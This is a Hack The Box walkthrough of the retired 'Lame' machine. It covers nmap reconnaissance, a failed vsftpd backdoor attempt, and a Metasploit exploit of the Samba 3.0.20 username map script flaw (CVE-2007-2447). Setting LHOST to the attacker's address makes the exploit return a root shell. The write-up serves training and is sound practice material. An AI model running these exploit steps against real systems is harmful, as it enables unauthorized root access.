---
title: Lame
date: 2026-11-25
description: Samba 3.0.20 username map script command execution (CVE-2007-2447) gives a root shell directly.
kind: machine
os: linux
difficulty: easy
retired: true
tags: [linux, samba, smb, ftp, cve-2007-2447, metasploit]
---

Lame is an old Linux box. The way in is a 2007 Samba command injection bug that runs as root, so user and root fall at the same time. Two of the open services look promising and lead nowhere, which is most of what this box teaches.

Flags are redacted. HTB doesn't allow posting them.

## Recon

A full TCP SYN scan, skipping host discovery because the box doesn't answer pings:

```
sudo nmap -sS -Pn -p- -oA nmap 10.129.88.182
```

Five ports:

```
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

FTP, SSH, Samba, and distcc. Three of these have well-known exploits for the versions Lame runs, so the work is picking the one that actually fires.

## Two dead ends

The FTP banner is `220 (vsFTPd 2.3.4)`. That version shipped with a backdoor (anyone can trigger it by putting `:)` in the username), so it's the obvious first try. Anonymous login works, but the directory is empty:

```
230 Login successful.
ftp> ls
226 Directory send OK.
```

The Metasploit module for the backdoor fails:

```
[+] FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[!] Unable to connect to backdoor on 6200/TCP. Cooldown?
[*] Exploit completed, but no session was created.
```

The backdoor opens a shell on port 6200, and the firewall drops that port, so the banner is a trap. distcc on 3632 (CVE-2004-2687) is a real path to a low-privilege shell, but there's a faster one, so I skipped it.

## Samba

Null authentication works against SMB, which already says the config is loose:

```
nxc smb 10.129.88.182
SMB  10.129.88.182  445  LAME  [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True) (Null Auth:True)
```

The nmap SMB scripts name the version:

```
sudo nmap -p 139,445 -Pn --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* -oA nmap-smb 10.129.88.182
```

```
smb-os-discovery:
  OS: Unix (Samba 3.0.20-Debian)
```

The `tmp` share allows anonymous read/write, and the user list includes a real account, `makis`, alongside the usual service accounts. Both are useful to know, but neither is needed for the next step.

Samba 3.0.20 is vulnerable to CVE-2007-2447. When `username map script` is set in the config, Samba passes the login username to a shell without sanitizing it, so a username like `/=` followed by a command runs that command. The service runs as root, so the shell comes back as root. The Metasploit module needs only the target:

```
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.88.182
set LHOST 10.10.15.124
run
```

```
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

## Loot

Already root, so there's no privilege escalation. Both flags are readable:

```
root@lame:/# cat /home/makis/user.txt
root@lame:/# cat /root/root.txt
```

## Notes

- The whole box is one exploit against one service. The lesson is enumeration: three of the five ports look exploitable, and only Samba pays off, so version detection and knowing which CVE maps to which service is what saves time.
- The vsftpd banner is a deliberate distraction, and the backdoor it advertises is firewalled off.
- CVE-2007-2447 runs as root, so there's no user-then-root climb. On most boxes those are two separate problems.
